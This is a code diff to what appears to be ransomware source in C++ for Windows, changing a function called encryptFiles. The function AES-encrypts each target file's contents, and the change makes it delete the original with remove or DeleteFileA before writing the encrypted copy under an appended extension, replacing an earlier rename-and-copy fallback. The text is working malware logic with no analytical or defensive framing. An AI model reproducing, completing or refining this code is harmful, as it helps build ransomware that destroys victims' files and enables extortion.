@@ -395,24 +395,18 @@ void encryptFiles(vector<string> files, string key) {
             continue;
         }
         CloseHandle(hFile);
-
         ifstream fin(file, ios::binary | ios::in);
         vector<BYTE> data(istreambuf_iterator<char>(fin), {});
         fin.close();
+
         string content = aes_encrypt(key, base64_encode(&data[0], data.size()), IV);
-        ofstream fout(file, ios::out);
+
+        if (remove(file.c_str()) != 0)
+            DeleteFileA(file.c_str());
+
+        ofstream fout(file + FILE_EXTENSION, ios::out);
         fout.write((const char*)&content[0], content.size());
         fout.close();
-
-        if (rename(file.c_str(), (file + FILE_EXTENSION).c_str()) != 0) {
-            if (!MoveFile(LPCWSTR(file.c_str()), LPCWSTR((file + FILE_EXTENSION).c_str()))) {
-                ifstream  src(file, ios::binary);
-                ofstream  dst(file + FILE_EXTENSION, ios::binary);
-                dst << src.rdbuf();
-                src.close();
-                dst.close();
-            }
-        }
     }
 }
 
